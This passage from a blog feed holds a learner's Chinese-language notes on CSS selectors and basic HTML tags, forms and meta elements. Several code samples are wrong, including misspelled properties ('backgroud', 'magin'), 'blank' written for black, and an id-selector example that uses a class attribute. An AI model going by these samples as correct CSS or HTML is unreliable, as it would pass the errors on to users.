class="language-css"></span><br><span class="language-css"><span class="hljs-selector-tag">h1</span>&#123;</span><br><span class="language-css"><span class="hljs-attribute">color</span>:green</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="-2"><a href="#-2" class="headerlink" title=""></a><!--外部样式--></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--链接式--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/style.css&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--导入式,CSS2.1中,且内容较多时会先加载出网页结构，再进行渲染--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-keyword">@import</span> url(<span class="hljs-string">&quot;css/style.css&quot;</span>);</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="二、基本选择器"><a href="#二、基本选择器" class="headerlink" title="二、基本选择器"></a>二、基本选择器</h3><blockquote><p>注：优先级：id选择器 &gt; class选择器 &gt; 标签选择器</p></blockquote><h4 id="1-标签选择器"><a href="#1-标签选择器" class="headerlink" title="1.标签选择器"></a>1.标签选择器</h4><p>标签选择器会选择页面上所有的这个标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">h1</span>&#123;</span><br><span class="language-css">        <span class="hljs-attribute">color</span>:green;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我是标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我是标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>我是标题<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="2-类选择器"><a href="#2-类选择器" class="headerlink" title="2.类选择器"></a>2.类选择器</h4><blockquote><p>注:不要用以数字开头的id，它无法在 Mozilla 或 Firefox 中起作用</p></blockquote><p>格式：.class的名称{}</p><p>好处:可以多个标签归类</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-class">.hhh</span>&#123;</span><br><span class="language-css">        <span class="hljs-attribute">color</span>:red;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;hhh&quot;</span>&gt;</span>我是标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><style>    .hhh{        color:red;    }</style><h2 class="hhh">标题</h2><h4 id="3-id选择器"><a href="#3-id选择器" class="headerlink" title="3.id选择器"></a>3.id选择器</h4><blockquote><p>注:不要用以数字开头的id，它无法在 Mozilla 或 Firefox 中起作用</p></blockquote><p>格式：#id名称{}</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-id">#hh</span>&#123;</span><br><span class="language-css">        <span class="hljs-attribute">color</span>:red;</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;hh&quot;</span>&gt;</span>标签<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="三、层次选择器"><a href="#三、层次选择器" class="headerlink" title="三、层次选择器"></a>三、层次选择器</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>6<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h4 id="1-后代选择器"><a href="#1-后代选择器" class="headerlink" title="1.后代选择器"></a>1.后代选择器</h4><p>在某个元素后面</p><style>    body p{        backgroud:blank;    }</style><p>即body后面的p标签背景全部为黑色</p><h4 id="2-子选择器"><a href="#2-子选择器" class="headerlink" title="2.子选择器"></a>2.子选择器</h4><p>下面的一代，隔一代就没有了</p><style>    body>p{        backgroud:red;    }</style><h4 id="3-相邻兄弟选择器"><a href="#3-相邻兄弟选择器" class="headerlink" title="3.相邻兄弟选择器"></a>3.相邻兄弟选择器</h4><p>向下相邻，即只有下面一个</p><style>    .class+p{        backgroud:red;    }</style><h4 id="4-通用选择器"><a href="#4-通用选择器" class="headerlink" title="4.通用选择器"></a>4.通用选择器</h4><p>通用兄弟选择器，当前选中元素的向下所有同辈兄弟</p><style>    .class~p{        backgroud:red;    }</style><h3 id="三、结构伪类选择器"><a href="#三、结构伪类选择器" class="headerlink" title="三、结构伪类选择器"></a>三、结构伪类选择器</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>4<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>6<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><!--当想选中ul下的第一个子元素时><style><!--当想选中ul下的第一个子元素时>    ul li:first-child{background:red;}<!--当想选中ul下的最后一个子元素时--><p>ul li:last-child{<br>background:green;<br>}</p><!--当想选中p1：定位到父元素，选择当前的第一个元素，选择当前p元素的父级元素，选中父级元素的第一个，并且是当前元素才生效--><p>p:nth-child(1){<br>    ……<br>    }<br></style></p>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTML基础学习</title>
    <link href="/2025/02/22/html/"/>
    <url>/2025/02/22/html/</url>
    
    <content type="html"><![CDATA[<blockquote><p>注：作者看两三个视频讲解html，发现<a href="https://www.runoob.com/html/html-tutorial.html">HTML 教程 | 菜鸟教程</a>这个网页很好</p><p>此文章为作者学习html笔记，作者html先学到这，接下来进军CSS</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>    <br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>这里网页标题,显示在网页标签栏<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>此处用p语句写文章主要段落<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>可以用h1，h2……<br>        来标注文章标题1，标题2……<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="一、基本标签"><a href="#一、基本标签" class="headerlink" title="一、基本标签"></a>一、基本标签</h3><h4 id="1-标题标签"><a href="#1-标题标签" class="headerlink" title="1.标题标签"></a>1.标题标签</h4><p>下面即为各级标题标签样式：</p><h1>一级标签h1</h1><h2>二级标签h2</h2><h3>三级标签h3</h3><h4 id="2-段落标签"><a href="#2-段落标签" class="headerlink" title="2.段落标签"></a>2.段落标签</h4><p>即为<p></p><p>这句话即为段落标签呈现的样式</p><h4 id="3-换行标签"><a href="#3-换行标签" class="headerlink" title="3.换行标签"></a>3.换行标签</h4><p>即为<br>br,此标签为单标签</p><h4 id="4-粗体、斜体"><a href="#4-粗体、斜体" class="headerlink" title="4.粗体、斜体"></a>4.粗体、斜体</h4><p>粗体：<strong>这中间即添加要加粗且具有强调作用–strong</strong></p><p>斜体：<em>这为斜体–em</em></p><h4 id="5-特殊符号"><a href="#5-特殊符号" class="headerlink" title="5.特殊符号"></a>5.特殊符号</h4><p>eg:</p><p>空格：空&nbsp;格，即为&amp;nbsp；——可以即为牛逼沙皮</p><blockquote><p>注：分号别忘了；</p></blockquote><p>大于号：&gt;——即为&amp;gt；</p><p>小于号：&lt;——即为&amp;lt；</p><p>版权符号：&copy;——即为&amp;copy；</p><h4 id="6-水平线标签"><a href="#6-水平线标签" class="headerlink" title="6.水平线标签"></a>6.水平线标签</h4><hr><p>即为hr</p><h3 id="二、图像标签"><a href="#二、图像标签" class="headerlink" title="二、图像标签"></a>二、图像标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;path&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;y&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><p>src：图像地址——分为相对路径和绝对路径</p><p>alt：图像替代文字；</p><p>title：鼠标悬停文字</p><h3 id="三、链接标签"><a href="#三、链接标签" class="headerlink" title="三、链接标签"></a>三、链接标签</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;path&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;目标窗口位置&quot;</span>&gt;</span>点击跳转<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>href必填，表示跳转到的哪个网页</p><p>补充：..&#x2F;表示上一级目录</p><h4 id="关于target的补充："><a href="#关于target的补充：" class="headerlink" title="关于target的补充："></a>关于target的补充：</h4><blockquote><p><strong>_self</strong></p><p>表示在同一窗口或标签页中打开链接文档。通常情况下，不需要显式指定这个值。例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_self&quot;</span>&gt;</span>链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>适用于不需要新开标签或窗口的情况</p><p><strong>_blank</strong></p><p><em>_blank</em> 表示在新的窗口或标签页中打开链接文档。这种方式适用于需要在新标签页或新窗口中打开链接，同时保留原页面的浏览。例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在使用 <em>_blank</em> 打开的链接时，建议添加 <em>rel&#x3D;”noopener noreferrer”</em> 属性，以防止被打开的页面访问原页面的 <em>window</em> 对象，提高安全性</p><p><strong>_parent</strong></p><p><em>_parent</em> 表示在父框架中打开链接文档。如果当前页面没有父框架，则效果与 <em>_self</em> 相同。例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_parent&quot;</span>&gt;</span>链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>适用于嵌套框架的情况。</p><p><strong>_top</strong></p><p><em>_top</em> 表示在整个浏览器窗口中打开链接文档，覆盖掉任何嵌套的框架。例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_top&quot;</span>&gt;</span>链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>适用于需要在最顶层窗口中打开链接的情况。</p></blockquote><h4 id="2-锚链接"><a href="#2-锚链接" class="headerlink" title="2.锚链接"></a>2.锚链接</h4><p>需要一个标记，在跳转至标记</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;top&quot;</span>&gt;</span>顶部<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-comment">&lt;!--在像跳转的地方加上这个，此即为标记的标准--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#top&quot;</span>&gt;</span>回到顶部<span class="hljs-comment">&lt;!--#加上标记的名字&gt;</span><br><span class="hljs-comment">&lt;!--也可以组合使用--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com#top&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="3-功能性链接"><a href="#3-功能性链接" class="headerlink" title="3.功能性链接"></a>3.功能性链接</h4><h5 id="邮件链接：mailto"><a href="#邮件链接：mailto" class="headerlink" title="邮件链接：mailto"></a>邮件链接：mailto</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;mailto:邮箱地址&quot;</span>&gt;</span>点击联系我<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="QQ链接"><a href="#QQ链接" class="headerlink" title="QQ链接"></a>QQ链接</h5><p>使用QQ推广，复制代码即可</p><h3 id="四、列表标签"><a href="#四、列表标签" class="headerlink" title="四、列表标签"></a>四、列表标签</h3><h4 id="1-有序列表："><a href="#1-有序列表：" class="headerlink" title="1.有序列表："></a>1.有序列表：<ol></h4><ol>    <li>java</li>    <li>c++</li>    <li>python</li></ol><h4 id="2-无序列表"><a href="#2-无序列表" class="headerlink" title="2.无序列表"></a>2.无序列表<ul></h4><ul>    <li>java<li>    <li>c++<li>    <li>python<li></ul><h4 id="3-自定义列表"><a href="#3-自定义列表" class="headerlink" title="3.自定义列表"></a>3.自定义列表</h4><p>dl：标签</p><p>dt：列表名称</p><p>dd：列表内容</p><p>eg:</p><dl>    <dt>学科</dt>    <dd>JAVA</dd>    <dd>C++</dd>    <dt>位置</dt>    <dd>北京</dd>    <dd>南京</dd></dl><blockquote><p>补：多用于网页底部</p></blockquote><h3 id="表格标签"><a href="#表格标签" class="headerlink" title="表格标签"></a>表格标签</h3><p>table</p><p>行——tr</p><p>列——td</p><p>eg:</p><table>    <tr>        <td>1-1</td>        <td>1-2</td>        <td>1-3</td>    <tr>        <td>2-1</td>        <td>2-2</td>        <td>2-3</td></table>跨列：colspan<p>跨行：rowspan</p><table>    <tr>        <td colspan="3">1-1</td>    </tr>    <tr>        <td>1-2</td>        <td>1-3</td>    </tr>    <tr>        <td rowspan="2">2-1</td>    </tr>    <tr>        <td>2-2</td>        <td>2-3</td>    </tr></table><h3 id="五、页面结构"><a href="#五、页面结构" class="headerlink" title="五、页面结构"></a>五、页面结构</h3><p><img src="D:\HEXO\hexo-blog\source_posts\html\页面结构.jpg" alt="页面结构"></p><h3 id="六、iframe"><a href="#六、iframe" class="headerlink" title="六、iframe"></a>六、iframe</h3><p>内联框架,可以在网页内直接访问其他网站</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;path&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;mainFrame&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot; px&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot; px&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="七、表单"><a href="#七、表单" class="headerlink" title="七、表单"></a>七、表单</h3><h4 id="post和get"><a href="#post和get" class="headerlink" title="post和get"></a>post和get</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;result.html&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--method：post，get规定如何发送表单数据--&gt;</span><br><span class="hljs-comment">&lt;!--action表示向何处发送表单数据,可以是网站，也可以是一个请求处理地址--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>eg:</p><form method="post" action="https://www.example.com">    <p>名字<input type="text" name="username"></p>    <p>密码<input type="password" name="password"></p>    <p>    <input type="submit">    <input type="reset">    </p><p>post :提交比较安全，传输大文件</p><p>get:可以看到具体提交内容，不安全</p><h4 id="input输入标签"><a href="#input输入标签" class="headerlink" title="input输入标签"></a>input输入标签</h4><p>有type属性定义类型<input type=""></p><p>几种常见类型 eg：</p><h5 id="text"><a href="#text" class="headerlink" title="text"></a>text</h5><p>：当用户要在表单中输入字母数字时，就会用到文本域</p><form>First name: <input type="text" name="firstname"><br>Last name: <input type="text" name="lastname"></form><p>（文本域的默认宽度是 20 个字符</p><h5 id="password"><a href="#password" class="headerlink" title="password"></a>password</h5><p>：密码字段通过标签 <strong><input type="password"></strong></p><p>eg:</p><form>Password: <input type="password" name="pwd"></form><h5 id="radio"><a href="#radio" class="headerlink" title="radio"></a>radio</h5><p>单选按钮</p><p>eg:</p><form action=""><input type="radio" name="sex" value="male">男<br><input type="radio" name="sex" value="female">女</form><h5 id="checkbox"><a href="#checkbox" class="headerlink" title="checkbox"></a>checkbox</h5><p>多选框</p><p>eg：</p><form><input type="checkbox" name="vehicle[]" value="Bike">我喜欢自行车<br><input type="checkbox" name="vehicle[]" value="Car">我喜欢小汽车</form><h5 id="submit"><a href="#submit" class="headerlink" title="submit"></a>submit</h5><p>提交按钮</p><form name="input" action="html_form_action.php" method="get">Username: <input type="text" name="user"><input type="submit" value="Submit"></form><h5 id="select"><a href="#select" class="headerlink" title="select"></a>select</h5><p>下拉框</p><p>eg：</p><form action=""><select name="cars"><option value="volvo">Volvo</option><option value="saab">Saab</option><option value="fiat">Fiat</option><option value="audi">Audi</option></select></form><h3 id="八、其他"><a href="#八、其他" class="headerlink" title="八、其他"></a>八、其他</h3><h4 id="1-meta"><a href="#1-meta" class="headerlink" title="1.meta"></a>1.meta</h4><p>将其加在head部分</p><h5 id="1）声明字符编码"><a href="#1）声明字符编码" class="headerlink" title="1）声明字符编码"></a>1）声明字符编码</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span> <br></code></pre></td></tr></table></figure><h5 id="2）实现网页自适应"><a href="#2）实现网页自适应" class="headerlink" title="2）实现网页自适应"></a>2）实现网页自适应</h5><h5 id="3）实现搜索引擎优化"><a href="#3）实现搜索引擎优化" class="headerlink" title="3）实现搜索引擎优化"></a>3）实现搜索引擎优化</h5><meta "description" content="此处写大致网页内容"><meta "name"="keywords"content="此处写网页关键词"><meta "author"content="此处写作者名"><blockquote><p><code>注：这些内容不会在网页上显示，但爬虫会爬取这些内容，实现优先推荐</code></p></blockquote><h5 id="4）实现自动跳转"><a href="#4）实现自动跳转" class="headerlink" title="4）实现自动跳转"></a>4）实现自动跳转</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;refresh&quot;</span><span class="hljs-attr">content</span>=<span class="hljs-string">&quot;此处为填写多长时间后跳转;此处写跳转网页的URL&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="2-style"><a href="#2-style" class="headerlink" title="2.style"></a>2.style</h4><p>可出现在任何位置</p><h5 id="属性："><a href="#属性：" class="headerlink" title="属性："></a>属性：</h5><ul><li>media：媒体, screen&#x2F;print&#x2F;all，表示在什么情况下使用该元素定义的样式</li><li>scoped：范围</li><li>type：类型,text&#x2F;css</li></ul><p>eg：</p><style type="text/css">    h1 {color:red}    a {        color:yellow;        background:black;    }    body {        background-image:url("图片路径")    }    h1 {        text-align:center;        #此操作为将文章h1标题居中        magin-left: 60%;        #左边距        }p {    text-indent: 32px;        #缩进32个像素    font-size: 16px;        #字体尺寸    line-height:32px;        #行高}    #大括号内为css代码，以此实现美化</style><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">media</span>=<span class="hljs-string">&quot;print&quot;</span>&gt;</span><span class="language-css"></span><br><span class="language-css">    <span class="hljs-selector-tag">h1</span> &#123;</span><br><span class="language-css">        此为打印模式下，使用的样式</span><br><span class="language-css">    &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><style media="screen">#### 3.link##### 1）链接外部样式表（将style从中抽出，避免太多）##### 属性：![link属性](D:\HEXO\hexo-blog\source\_posts\html\link属性.jpg)> 注：其中rel属性是必选的，它说明当前文档与被链接资源之间的关系eg:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">media</span>=<span class="hljs-string">&quot;此处写要显示的设备&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;填写文件名&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>##### 2）链接网站图标即favicon，rel改为icon<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;icon&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;文件地址&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>#### 3.basehref——指HTML所有相对链接的基准URLtarget——指在何处打开超链接> ##### 1）指定基准路径eg：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;绝对路径&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;属性&quot;</span>&gt;</span><span 